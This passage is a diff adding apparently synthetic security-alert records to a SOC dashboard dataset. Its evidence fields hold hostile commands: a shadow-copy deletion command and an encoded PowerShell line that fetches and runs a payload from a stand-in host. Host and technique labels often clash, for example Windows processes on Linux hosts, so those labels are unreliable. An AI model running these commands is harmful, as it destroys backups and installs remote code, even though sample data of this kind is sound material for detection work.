@@ -197,5 +197,1539 @@
     },
     "createdAt": "2026-05-31T13:51:12.783Z",
     "updatedAt": "2026-05-31T13:51:12.783Z"
+  },
+  {
+    "_id": "1hchhu9",
+    "timestamp": "2026-05-31T14:26:01.219Z",
+    "severity": "CRITICAL",
+    "title": "Active Directory Shadow Copy Access",
+    "description": "VSSADMIN execution matching NTDS.dit exfiltration patterns was observed.",
+    "category": "Credential Dumping",
+    "host": "WIN-SOC-DEV-05",
+    "status": "NEW",
+    "assignedTo": "Unassigned",
+    "evidence": {
+      "command": "vssadmin delete shadows /all /quiet",
+      "process": "cmd.exe",
+      "mitreTactic": "Credential Access",
+      "mitreTechnique": "T1003 - OS Credential Dumping"
+    },
+    "createdAt": "2026-05-31T14:26:01.221Z",
+    "updatedAt": "2026-05-31T14:26:01.221Z"
+  },
+  {
+    "_id": "amnlez7",
+    "timestamp": "2026-05-31T14:26:16.218Z",
+    "severity": "HIGH",
+    "title": "Persistence Registry Mechanism Configured",
+    "description": "Unauthorized RunKey modification added targeting system startup scripts.",
+    "category": "Persistence",
+    "host": "WIN-SOC-DEV-05",
+    "status": "NEW",
+    "assignedTo": "Unassigned",
+    "evidence": {
+      "registryKey": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Spyware",
+      "value": "C:\\Users\\Public\\updater.exe",
+      "mitreTactic": "Persistence",
+      "mitreTechnique": "T1547 - Boot or Logon Autostart Execution"
+    },
+    "createdAt": "2026-05-31T14:26:16.219Z",
+    "updatedAt": "2026-05-31T14:26:16.219Z"
+  },
+  {
+    "_id": "i1b16gx",
+    "timestamp": "2026-05-31T14:26:31.219Z",
+    "severity": "CRITICAL",
+    "title": "Active Directory Shadow Copy Access",
+    "description": "VSSADMIN execution matching NTDS.dit exfiltration patterns was observed.",
+    "category": "Credential Dumping",
+    "host": "LINUX-SOC-DB-02",
+    "status": "NEW",
+    "assignedTo": "Unassigned",
+    "evidence": {
+      "command": "vssadmin delete shadows /all /quiet",
+      "process": "cmd.exe",
+      "mitreTactic": "Credential Access",
+      "mitreTechnique": "T1003 - OS Credential Dumping"
+    },
+    "createdAt": "2026-05-31T14:26:31.220Z",
+    "updatedAt": "2026-05-31T14:26:31.220Z"
+  },
+  {
+    "_id": "vnhsgfu",
+    "timestamp": "2026-05-31T14:26:46.220Z",
+    "severity": "HIGH",
+    "title": "Lateral Movement Attempted",
+    "description": "WMI Win32_Process creation detected targeting remote admin shares.",
+    "category": "Lateral Movement",
+    "host": "WIN-SOC-PROD-01",
+    "status": "NEW",
+    "assignedTo": "Unassigned",
+    "evidence": {
+      "protocol": "WMI",
+      "src": "WIN-SOC-DEV-05",
+      "dest": "WIN-SOC-PROD-01",
+      "mitreTactic": "Lateral Movement",
+      "mitreTechnique": "T1021 - Remote Services"
+    },
+    "createdAt": "2026-05-31T14:26:46.221Z",
+    "updatedAt": "2026-05-31T14:26:46.221Z"
+  },
+  {
+    "_id": "mm30orj",
+    "timestamp": "2026-05-31T14:27:01.220Z",
+    "severity": "CRITICAL",
+    "title": "Cobalt Strike Beacon Injected",
+    "description": "Suspicious DLL execution detected in memory address space of svchost.exe.",
+    "category": "Malware",
+    "host": "WIN-SOC-PROD-01",
+    "status": "NEW",
+    "assignedTo": "Unassigned",
+    "evidence": {
+      "process": "svchost.exe",
+      "parent": "powershell.exe",
+      "integrityLevel": "SYSTEM",
+      "mitreTactic": "Execution",
+      "mitreTechnique": "T1059 - Command and Scripting Interpreter"
+    },
+    "createdAt": "2026-05-31T14:27:01.221Z",
+    "updatedAt": "2026-05-31T14:27:01.221Z"
+  },
+  {
+    "_id": "thouumd",
+    "timestamp": "2026-05-31T14:27:16.221Z",
+    "severity": "HIGH",
+    "title": "Lateral Movement Attempted",
+    "description": "WMI Win32_Process creation detected targeting remote admin shares.",
+    "category": "Lateral Movement",
+    "host": "LINUX-WEB-APP-01",
+    "status": "NEW",
+    "assignedTo": "Unassigned",
+    "evidence": {
+      "protocol": "WMI",
+      "src": "WIN-SOC-DEV-05",
+      "dest": "WIN-SOC-PROD-01",
+      "mitreTactic": "Lateral Movement",
+      "mitreTechnique": "T1021 - Remote Services"
+    },
+    "createdAt": "2026-05-31T14:27:16.221Z",
+    "updatedAt": "2026-05-31T14:27:16.221Z"
+  },
+  {
+    "_id": "h5ypr9q",
+    "timestamp": "2026-05-31T14:27:31.221Z",
+    "severity": "HIGH",
+    "title": "Lateral Movement Attempted",
+    "description": "WMI Win32_Process creation detected targeting remote admin shares.",
+    "category": "Lateral Movement",
+    "host": "LINUX-SOC-DB-02",
+    "status": "NEW",
+    "assignedTo": "Unassigned",
+    "evidence": {
+      "protocol": "WMI",
+      "src": "WIN-SOC-DEV-05",
+      "dest": "WIN-SOC-PROD-01",
+      "mitreTactic": "Lateral Movement",
+      "mitreTechnique": "T1021 - Remote Services"
+    },
+    "createdAt": "2026-05-31T14:27:31.221Z",
+    "updatedAt": "2026-05-31T14:27:31.221Z"
+  },
+  {
+    "_id": "0nmicx6",
+    "timestamp": "2026-05-31T14:27:46.221Z",
+    "severity": "CRITICAL",
+    "title": "Active Directory Shadow Copy Access",
+    "description": "VSSADMIN execution matching NTDS.dit exfiltration patterns was observed.",
+    "category": "Credential Dumping",
+    "host": "WIN-SOC-AD-02",
+    "status": "NEW",
+    "assignedTo": "Unassigned",
+    "evidence": {
+      "command": "vssadmin delete shadows /all /quiet",
+      "process": "cmd.exe",
+      "mitreTactic": "Credential Access",
+      "mitreTechnique": "T1003 - OS Credential Dumping"
+    },
+    "createdAt": "2026-05-31T14:27:46.224Z",
+    "updatedAt": "2026-05-31T14:27:46.224Z"
+  },
+  {
+    "_id": "i00dii3",
+    "timestamp": "2026-05-31T14:28:01.223Z",
+    "severity": "CRITICAL",
+    "title": "Cobalt Strike Beacon Injected",
+    "description": "Suspicious DLL execution detected in memory address space of svchost.exe.",
+    "category": "Malware",
+    "host": "WIN-SOC-DEV-05",
+    "status": "NEW",
+    "assignedTo": "Unassigned",
+    "evidence": {
+      "process": "svchost.exe",
+      "parent": "powershell.exe",
+      "integrityLevel": "SYSTEM",
+      "mitreTactic": "Execution",
+      "mitreTechnique": "T1059 - Command and Scripting Interpreter"
+    },
+    "createdAt": "2026-05-31T14:28:01.224Z",
+    "updatedAt": "2026-05-31T14:28:01.224Z"
+  },
+  {
+    "_id": "895ylln",
+    "timestamp": "2026-05-31T14:28:16.224Z",
+    "severity": "HIGH",
+    "title": "Lateral Movement Attempted",
+    "description": "WMI Win32_Process creation detected targeting remote admin shares.",
+    "category": "Lateral Movement",
+    "host": "LINUX-SOC-DB-02",
+    "status": "NEW",
+    "assignedTo": "Unassigned",
+    "evidence": {
+      "protocol": "WMI",
+      "src": "WIN-SOC-DEV-05",
+      "dest": "WIN-SOC-PROD-01",
+      "mitreTactic": "Lateral Movement",
+      "mitreTechnique": "T1021 - Remote Services"
+    },
+    "createdAt": "2026-05-31T14:28:16.225Z",
+    "updatedAt": "2026-05-31T14:28:16.225Z"
+  },
+  {
+    "_id": "41bnnxq",
+    "timestamp": "2026-05-31T14:28:31.226Z",
+    "severity": "HIGH",
+    "title": "Brute Force SSH Attack",
+    "description": "Multiple failed authentication attempts detected from a known malicious IP address.",
+    "category": "Credential Access",
+    "host": "LINUX-WEB-APP-01",
+    "status": "NEW",
+    "assignedTo": "Unassigned",
+    "evidence": {
+      "service": "sshd",
+      "failures": 42,
+      "ip": "185.220.101.5",
+      "mitreTactic": "Credential Access",
+      "mitreTechnique": "T1110 - Brute Force"
+    },
+    "createdAt": "2026-05-31T14:28:31.226Z",
+    "updatedAt": "2026-05-31T14:28:31.226Z"
+  },
+  {
+    "_id": "65cgdew",
+    "timestamp": "2026-05-31T14:28:46.226Z",
+    "severity": "CRITICAL",
+    "title": "Cobalt Strike Beacon Injected",
+    "description": "Suspicious DLL execution detected in memory address space of svchost.exe.",
+    "category": "Malware",
+    "host": "WIN-SOC-PROD-01",
+    "status": "NEW",
+    "assignedTo": "Unassigned",
+    "evidence": {
+      "process": "svchost.exe",
+      "parent": "powershell.exe",
+      "integrityLevel": "SYSTEM",
+      "mitreTactic": "Execution",
+      "mitreTechnique": "T1059 - Command and Scripting Interpreter"
+    },
+    "createdAt": "2026-05-31T14:28:46.227Z",
+    "updatedAt": "2026-05-31T14:28:46.227Z"
+  },
+  {
+    "_id": "9ausumi",
+    "timestamp": "2026-05-31T14:29:01.228Z",
+    "severity": "CRITICAL",
+    "title": "Malicious EML Attachment Opened",
+    "description": "Outlook spawned child process powershell.exe executing encoded command line arguments.",
+    "category": "Phishing",
+    "host": "WIN-SOC-PROD-01",
+    "status": "NEW",
+    "assignedTo": "Unassigned",
+    "evidence": {
+      "parent": "outlook.exe",
+      "process": "powershell.exe",
+      "args": "-enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AYgBhAGQAdQByAGwALgBjAG8AbQAvAHAAYQB5AGwAbwBhAGQAJwApAA==",
+      "mitreTactic": "Initial Access",
+      "mitreTechnique": "T1566 - Phishing"
+    },
+    "createdAt": "2026-05-31T14:29:01.229Z",
+    "updatedAt": "2026-05-31T14:29:01.229Z"
+  },
+  {
+    "_id": "ngqll2y",
+    "timestamp": "2026-05-31T14:29:16.229Z",
+    "severity": "CRITICAL",
+    "title": "Malicious EML Attachment Opened",
+    "description": "Outlook spawned child process powershell.exe executing encoded command line arguments.",
+    "category": "Phishing",
+    "host": "WIN-SOC-AD-02",
+    "status": "NEW",
+    "assignedTo": "Unassigned",
+    "evidence": {
+      "parent": "outlook.exe",
+      "process": "powershell.exe",
+      "args": "-enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AYgBhAGQAdQByAGwALgBjAG8AbQAvAHAAYQB5AGwAbwBhAGQAJwApAA==",
+      "mitreTactic": "Initial Access",
+      "mitreTechnique": "T1566 - Phishing"
+    },
+    "createdAt": "2026-05-31T14:29:16.231Z",
+    "updatedAt": "2026-05-31T14:29:16.231Z"
+  },
+  {
+    "_id": "mjhxt4y",
+    "timestamp": "2026-05-31T14:29:31.230Z",
+    "severity": "HIGH",
+    "title": "Persistence Registry Mechanism Configured",
+    "description": "Unauthorized RunKey modification added targeting system startup scripts.",
+    "category": "Persistence",
+    "host": "WIN-SOC-PROD-01",
+    "status": "NEW",
+    "assignedTo": "Unassigned",
+    "evidence": {
+      "registryKey": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Spyware",
+      "value": "C:\\Users\\Public\\updater.exe",
+      "mitreTactic": "Persistence",
+      "mitreTechnique": "T1547 - Boot or Logon Autostart Execution"
+    },
+    "createdAt": "2026-05-31T14:29:31.231Z",
+    "updatedAt": "2026-05-31T14:29:31.231Z"
+  },
+  {
+    "_id": "t2ngzwo",
+    "timestamp": "2026-05-31T14:29:46.232Z",
+    "severity": "CRITICAL",
+    "title": "Malicious EML Attachment Opened",
+    "description": "Outlook spawned child process powershell.exe executing encoded command line arguments.",
+    "category": "Phishing",
+    "host": "WIN-SOC-PROD-01",
+    "status": "NEW",
+    "assignedTo": "Unassigned",
+    "evidence": {
+      "parent": "outlook.exe",
+      "process": "powershell.exe",
+      "args": "-enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AYgBhAGQAdQByAGwALgBjAG8AbQAvAHAAYQB5AGwAbwBhAGQAJwApAA==",
+      "mitreTactic": "Initial Access",
+      "mitreTechnique": "T1566 - Phishing"
+    },
+    "createdAt": "2026-05-31T14:29:46.232Z",
+    "updatedAt": "2026-05-31T14:29:46.232Z"
+  },
+  {
+    "_id": "d76oahf",
+    "timestamp": "2026-05-31T14:30:01.234Z",
+    "severity": "HIGH",
+    "title": "Brute Force SSH Attack",
+    "description": "Multiple failed authentication attempts detected from a known malicious IP address.",
+    "category": "Credential Access",
+    "host": "WIN-SOC-PROD-01",
+    "status": "NEW",
+    "assignedTo": "Unassigned",
+    "evidence": {
+      "service": "sshd",
+      "failures": 42,
+      "ip": "185.220.101.5",
+      "mitreTactic": "Credential Access",
+      "mitreTechnique": "T1110 - Brute Force"
+    },
+    "createdAt": "2026-05-31T14:30:01.235Z",
+    "updatedAt": "2026-05-31T14:30:01.235Z"
+  },
+  {
+    "_id": "p2nhe39",
+    "timestamp": "2026-05-31T14:30:16.234Z",
+    "severity": "HIGH",
+    "title": "Lateral Movement Attempted",
+    "description": "WMI Win32_Process creation detected targeting remote admin shares.",
+    "category": "Lateral Movement",
+    "host": "LINUX-WEB-APP-01",
+    "status": "NEW",
+    "assignedTo": "Unassigned",
+    "evidence": {
+      "protocol": "WMI",
+      "src": "WIN-SOC-DEV-05",
+      "dest": "WIN-SOC-PROD-01",
+      "mitreTactic": "Lateral Movement",
+      "mitreTechnique": "T1021 - Remote Services"
+    },
+    "createdAt": "2026-05-31T14:30:16.235Z",
+    "updatedAt": "2026-05-31T14:30:16.235Z"
+  },
+  {
+    "_id": "cmad3qd",
+    "timestamp": "2026-05-31T14:30:31.236Z",
+    "severity": "HIGH",
+    "title": "Brute Force SSH Attack",
+    "description": "Multiple failed authentication attempts detected from a known malicious IP address.",
+    "category": "Credential Access",
+    "host": "WIN-SOC-AD-02",
+    "status": "NEW",
+    "assignedTo": "Unassigned",
+    "evidence": {
+      "service": "sshd",
+      "failures": 42,
+      "ip": "185.220.101.5",
+      "mitreTactic": "Credential Access",
+      "mitreTechnique": "T1110 - Brute Force"
+    },
+    "createdAt": "2026-05-31T14:30:31.236Z",
+    "updatedAt": "2026-05-31T14:30:31.236Z"
+  },
+  {
+    "_id": "ht7q40b",
+    "timestamp": "2026-05-31T14:30:46.236Z",
+    "severity": "CRITICAL",
+    "title": "Cobalt Strike Beacon Injected",
+    "description": "Suspicious DLL execution detected in memory address space of svchost.exe.",
+    "category": "Malware",
+    "host": "WIN-SOC-AD-02",
+    "status": "NEW",
+    "assignedTo": "Unassigned",
+    "evidence": {
+      "process": "svchost.exe",
+      "parent": "powershell.exe",
+      "integrityLevel": "SYSTEM",
+      "mitreTactic": "Execution",
+      "mitreTechnique": "T1059 - Command and Scripting Interpreter"
+    },
+    "createdAt": "2026-05-31T14:30:46.236Z",
+    "updatedAt": "2026-05-31T14:30:46.236Z"
+  },
+  {
+    "_id": "7y9qtv5",
+    "timestamp": "2026-05-31T14:31:01.237Z",
+    "severity": "CRITICAL",
+    "title": "Cobalt Strike Beacon Injected",
+    "description": "Suspicious DLL execution detected in memory address space of svchost.exe.",
+    "category": "Malware",
+    "host": "WIN-SOC-DEV-05",
+    "status": "NEW",
+    "assignedTo": "Unassigned",
+    "evidence": {
+      "process": "svchost.exe",
+      "parent": "powershell.exe",
+      "integrityLevel": "SYSTEM",
+      "mitreTactic": "Execution",
+      "mitreTechnique": "T1059 - Command and Scripting Interpreter"
+    },
+    "createdAt": "2026-05-31T14:31:01.238Z",
+    "updatedAt": "2026-05-31T14:31:01.238Z"
+  },
+  {
+    "_id": "piemwuw",
+    "timestamp": "2026-05-31T14:31:16.237Z",
+    "severity": "HIGH",
+    "title": "Brute Force SSH Attack",
+    "description": "Multiple failed authentication attempts detected from a known malicious IP address.",
+    "category": "Credential Access",
+    "host": "LINUX-SOC-DB-02",
+    "status": "NEW",
+    "assignedTo": "Unassigned",
+    "evidence": {
+      "service": "sshd",
+      "failures": 42,
+      "ip": "185.220.101.5",
+      "mitreTactic": "Credential Access",
+      "mitreTechnique": "T1110 - Brute Force"
+    },
+    "createdAt": "2026-05-31T14:31:16.238Z",
+    "updatedAt": "2026-05-31T14:31:16.238Z"
+  },
+  {
+    "_id": "k71nt0r",
+    "timestamp": "2026-05-31T14:31:31.238Z",
+    "severity": "CRITICAL",
+    "title": "Malicious EML Attachment Opened",
+    "description": "Outlook spawned child process powershell.exe executing encoded command line arguments.",
+    "category": "Phishing",
+    "host": "WIN-SOC-AD-02",
+    "status": "NEW",
+    "assignedTo": "Unassigned",
+    "evidence": {
+      "parent": "outlook.exe",
+      "process": "powershell.exe",
+      "args": "-enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AYgBhAGQAdQByAGwALgBjAG8AbQAvAHAAYQB5AGwAbwBhAGQAJwApAA==",
+      "mitreTactic": "Initial Access",
+      "mitreTechnique": "T1566 - Phishing"
+    },
+    "createdAt": "2026-05-31T14:31:31.239Z",
+    "updatedAt": "2026-05-31T14:31:31.239Z"
+  },
+  {
+    "_id": "9d4bzf6",
+    "timestamp": "2026-05-31T14:31:46.240Z",
+    "severity": "HIGH",
+    "title": "Brute Force SSH Attack",
+    "description": "Multiple failed authentication attempts detected from a known malicious IP address.",
+    "category": "Credential Access",
+    "host": "WIN-SOC-PROD-01",
+    "status": "NEW",
+    "assignedTo": "Unassigned",
+    "evidence": {
+      "service": "sshd",
+      "failures": 42,
+      "ip": "185.220.101.5",
+      "mitreTactic": "Credential Access",
+      "mitreTechnique": "T1110 - Brute Force"
+    },
+    "createdAt": "2026-05-31T14:31:46.241Z",
+    "updatedAt": "2026-05-31T14:31:46.241Z"
+  },
+  {
+    "_id": "lju35dq",
+    "timestamp": "2026-05-31T14:32:01.241Z",
+    "severity": "HIGH",
+    "title": "Lateral Movement Attempted",
+    "description": "WMI Win32_Process creation detected targeting remote admin shares.",
+    "category": "Lateral Movement",
+    "host": "WIN-SOC-PROD-01",
+    "status": "NEW",
+    "assignedTo": "Unassigned",
+    "evidence": {
+      "protocol": "WMI",
+      "src": "WIN-SOC-DEV-05",
+      "dest": "WIN-SOC-PROD-01",
+      "mitreTactic": "Lateral Movement",
+      "mitreTechnique": "T1021 - Remote Services"
+    },
+    "createdAt": "2026-05-31T14:32:01.242Z",
+    "updatedAt": "2026-05-31T14:32:01.242Z"
+  },
+  {
+    "_id": "jii2qc4",
+    "timestamp": "2026-05-31T14:32:16.241Z",
+    "severity": "CRITICAL",
+    "title": "Cobalt Strike Beacon Injected",
+    "description": "Suspicious DLL execution detected in memory address space of svchost.exe.",
+    "category": "Malware",
+    "host": "WIN-SOC-DEV-05",
+    "status": "NEW",
+    "assignedTo": "Unassigned",
+    "evidence": {
+      "process": "svchost.exe",
+      "parent": "powershell.exe",
+      "integrityLevel": "SYSTEM",
+      "mitreTactic": "Execution",
+      "mitreTechnique": "T1059 - Command and Scripting Interpreter"
+    },
+    "createdAt": "2026-05-31T14:32:16.242Z",
+    "updatedAt": "2026-05-31T14:32:16.242Z"
+  },
+  {
+    "_id": "roac9z8",
+    "timestamp": "2026-05-31T14:32:31.241Z",
+    "severity": "CRITICAL",
+    "title": "Active Directory Shadow Copy Access",
+    "description": "VSSADMIN execution matching NTDS.dit exfiltration patterns was observed.",
+    "category": "Credential Dumping",
+    "host": "WIN-SOC-AD-02",
+    "status": "NEW",
+    "assignedTo": "Unassigned",
+    "evidence": {
+      "command": "vssadmin delete shadows /all /quiet",
+      "process": "cmd.exe",
+      "mitreTactic": "Credential Access",
+      "mitreTechnique": "T1003 - OS Credential Dumping"
+    },
+    "createdAt": "2026-05-31T14:32:31.242Z",
+    "updatedAt": "2026-05-31T14:32:31.243Z"
+  },
+  {
+    "_id": "d6lg7zk",
+    "timestamp": "2026-05-31T14:32:46.242Z",
+    "severity": "HIGH",
+    "title": "Persistence Registry Mechanism Configured",
+    "description": "Unauthorized RunKey modification added targeting system startup scripts.",
+    "category": "Persistence",
+    "host": "LINUX-WEB-APP-01",
+    "status": "NEW",
+    "assignedTo": "Unassigned",
+    "evidence": {
+      "registryKey": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Spyware",
+      "value": "C:\\Users\\Public\\updater.exe",
+      "mitreTactic": "Persistence",
+      "mitreTechnique": "T1547 - Boot or Logon Autostart Execution"
+    },
+    "createdAt": "2026-05-31T14:32:46.242Z",
+    "updatedAt": "2026-05-31T14:32:46.242Z"
+  },
+  {
+    "_id": "aoqivwj",
+    "timestamp": "2026-05-31T14:33:01.243Z",
+    "severity": "CRITICAL",
+    "title": "Cobalt Strike Beacon Injected",
+    "description": "Suspicious DLL execution detected in memory address space of svchost.exe.",
+    "category": "Malware",
+    "host": "WIN-SOC-DEV-05",
+    "status": "NEW",
+    "assignedTo": "Unassigned",
+    "evidence": {
+      "process": "svchost.exe",
+      "parent": "powershell.exe",
+      "integrityLevel": "SYSTEM",
+      "mitreTactic": "Execution",
+      "mitreTechnique": "T1059 - Command and Scripting Interpreter"
+    },
+    "createdAt": "2026-05-31T14:33:01.244Z",
+    "updatedAt": "2026-05-31T14:33:01.244Z"
+  },
+  {
+    "_id": "pko7v2r",
+    "timestamp": "2026-05-31T14:33:16.245Z",
+    "severity": "HIGH",
+    "title": "Persistence Registry Mechanism Configured",
+    "description": "Unauthorized RunKey modification added targeting system startup scripts.",
+    "category": "Persistence",
+    "host": "LINUX-WEB-APP-01",
+    "status": "NEW",
+    "assignedTo": "Unassigned",
+    "evidence": {
+      "registryKey": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Spyware",
+      "value": "C:\\Users\\Public\\updater.exe",
+      "mitreTactic": "Persistence",
+      "mitreTechnique": "T1547 - Boot or Logon Autostart Execution"
+    },
+    "createdAt": "2026-05-31T14:33:16.246Z",
+    "updatedAt": "2026-05-31T14:33:16.246Z"
+  },
+  {
+    "_id": "ww55k9a",
+    "timestamp": "2026-05-31T14:33:31.245Z",
+    "severity": "HIGH",
+    "title": "Brute Force SSH Attack",
+    "description": "Multiple failed authentication attempts detected from a known malicious IP address.",
+    "category": "Credential Access",
+    "host": "WIN-SOC-DEV-05",
+    "status": "NEW",
+    "assignedTo": "Unassigned",
+    "evidence": {
+      "service": "sshd",
+      "failures": 42,
+      "ip": "185.220.101.5",
+      "mitreTactic": "Credential Access",
+      "mitreTechnique": "T1110 - Brute Force"
+    },
+    "createdAt": "2026-05-31T14:33:31.246Z",
+    "updatedAt": "2026-05-31T14:33:31.247Z"
+  },
+  {
+    "_id": "3j7zxdm",
+    "timestamp": "2026-05-31T14:33:46.246Z",
+    "severity": "HIGH",
+    "title": "Persistence Registry Mechanism Configured",
+    "description": "Unauthorized RunKey modification added targeting system startup scripts.",
+    "category": "Persistence",
+    "host": "WIN-SOC-PROD-01",
+    "status": "NEW",
+    "assignedTo": "Unassigned",
+    "evidence": {
+      "registryKey": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Spyware",
+      "value": "C:\\Users\\Public\\updater.exe",
+      "mitreTactic": "Persistence",
+      "mitreTechnique": "T1547 - Boot or Logon Autostart Execution"
+    },
+    "createdAt": "2026-05-31T14:33:46.247Z",
+    "updatedAt": "2026-05-31T14:33:46.247Z"
+  },
+  {
+    "_id": "se9tou0",
+    "timestamp": "2026-05-31T14:34:01.248Z",
+    "severity": "CRITICAL",
+    "title": "Malicious EML Attachment Opened",
+    "description": "Outlook spawned child process powershell.exe executing encoded command line arguments.",
+    "category": "Phishing",
+    "host": "WIN-SOC-AD-02",
+    "status": "NEW",
+    "assignedTo": "Unassigned",
+    "evidence": {
+      "parent": "outlook.exe",
+      "process": "powershell.exe",
+      "args": "-enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AYgBhAGQAdQByAGwALgBjAG8AbQAvAHAAYQB5AGwAbwBhAGQAJwApAA==",
+      "mitreTactic": "Initial Access",
+      "mitreTechnique": "T1566 - Phishing"
+    },
+    "createdAt": "2026-05-31T14:34:01.248Z",
+    "updatedAt": "2026-05-31T14:34:01.248Z"
+  },
+  {
+    "_id": "dqdxhc5",
+    "timestamp": "2026-05-31T14:34:16.249Z",
+    "severity": "CRITICAL",
+    "title": "Cobalt Strike Beacon Injected",
+    "description": "Suspicious DLL execution detected in memory address space of svchost.exe.",
+    "category": "Malware",
+    "host": "LINUX-WEB-APP-01",
+    "status": "NEW",
+    "assignedTo": "Unassigned",
+    "evidence": {
+      "process": "svchost.exe",
+      "parent": "powershell.exe",
+      "integrityLevel": "SYSTEM",
+      "mitreTactic": "Execution",
+      "mitreTechnique": "T1059 - Command and Scripting Interpreter"
+    },
+    "createdAt": "2026-05-31T14:34:16.250Z",
+    "updatedAt": "2026-05-31T14:34:16.250Z"
+  },
+  {
+    "_id": "v8ffnlw",
+    "timestamp": "2026-05-31T14:34:31.250Z",
+    "severity": "CRITICAL",
+    "title": "Malicious EML Attachment Opened",
+    "description": "Outlook spawned child process powershell.exe executing encoded command line arguments.",
+    "category": "Phishing",
+    "host": "LINUX-WEB-APP-01",
+    "status": "NEW",
+    "assignedTo": "Unassigned",
+    "evidence": {
+      "parent": "outlook.exe",
+      "process": "powershell.exe",
+      "args": "-enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AYgBhAGQAdQByAGwALgBjAG8AbQAvAHAAYQB5AGwAbwBhAGQAJwApAA==",
+      "mitreTactic": "Initial Access",
+      "mitreTechnique": "T1566 - Phishing"
+    },
+    "createdAt": "2026-05-31T14:34:31.251Z",
+    "updatedAt": "2026-05-31T14:34:31.251Z"
+  },
+  {
+    "_id": "1g3h6ke",
+    "timestamp": "2026-05-31T14:34:46.252Z",
+    "severity": "CRITICAL",
+    "title": "Malicious EML Attachment Opened",
+    "description": "Outlook spawned child process powershell.exe executing encoded command line arguments.",
+    "category": "Phishing",
+    "host": "LINUX-SOC-DB-02",
+    "status": "NEW",
+    "assignedTo": "Unassigned",
+    "evidence": {
+      "parent": "outlook.exe",
+      "process": "powershell.exe",
+      "args": "-enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AYgBhAGQAdQByAGwALgBjAG8AbQAvAHAAYQB5AGwAbwBhAGQAJwApAA==",
+      "mitreTactic": "Initial Access",
+      "mitreTechnique": "T1566 - Phishing"
+    },
+    "createdAt": "2026-05-31T14:34:46.253Z",
+    "updatedAt": "2026-05-31T14:34:46.253Z"
+  },
+  {
+    "_id": "rp97jbb",
+    "timestamp": "2026-05-31T14:35:01.253Z",
+    "severity": "HIGH",
+    "title": "Persistence Registry Mechanism Configured",
+    "description": "Unauthorized RunKey modification added targeting system startup scripts.",
+    "category": "Persistence",
+    "host": "WIN-SOC-AD-02",
+    "status": "NEW",
+    "assignedTo": "Unassigned",
+    "evidence": {
+      "registryKey": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Spyware",
+      "value": "C:\\Users\\Public\\updater.exe",
+      "mitreTactic": "Persistence",
+      "mitreTechnique": "T1547 - Boot or Logon Autostart Execution"
+    },
+    "createdAt": "2026-05-31T14:35:01.254Z",
+    "updatedAt": "2026-05-31T14:35:01.254Z"
+  },
+  {
+    "_id": "jby0ukj",
+    "timestamp": "2026-05-31T14:35:16.255Z",
+    "severity": "CRITICAL",
+    "title": "Cobalt Strike Beacon Injected",
+    "description": "Suspicious DLL execution detected in memory address space of svchost.exe.",
+    "category": "Malware",
+    "host": "WIN-SOC-AD-02",
+    "status": "NEW",
+    "assignedTo": "Unassigned",
+    "evidence": {
+      "process": "svchost.exe",
+      "parent": "powershell.exe",
+      "integrityLevel": "SYSTEM",
+      "mitreTactic": "Execution",
+      "mitreTechnique": "T1059 - Command and Scripting Interpreter"
+    },
+    "createdAt": "2026-05-31T14:35:16.256Z",
+    "updatedAt": "2026-05-31T14:35:16.256Z"
+  },
+  {
+    "_id": "bctotus",
+    "timestamp": "2026-05-31T14:35:31.256Z",
+    "severity": "CRITICAL",
+    "title": "Malicious EML Attachment Opened",
+    "description": "Outlook spawned child process powershell.exe executing encoded command line arguments.",
+    "category": "Phishing",
+    "host": "WIN-SOC-DEV-05",
+    "status": "NEW",
+    "assignedTo": "Unassigned",
+    "evidence": {
+      "parent": "outlook.exe",
+      "process": "powershell.exe",
+      "args": "-enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AYgBhAGQAdQByAGwALgBjAG8AbQAvAHAAYQB5AGwAbwBhAGQAJwApAA==",
+      "mitreTactic": "Initial Access",
+      "mitreTechnique": "T1566 - Phishing"
+    },
+    "createdAt": "2026-05-31T14:35:31.258Z",
+    "updatedAt": "2026-05-31T14:35:31.258Z"
+  },
+  {
+    "_id": "ow7rit2",
+    "timestamp": "2026-05-31T14:35:46.258Z",
+    "severity": "HIGH",
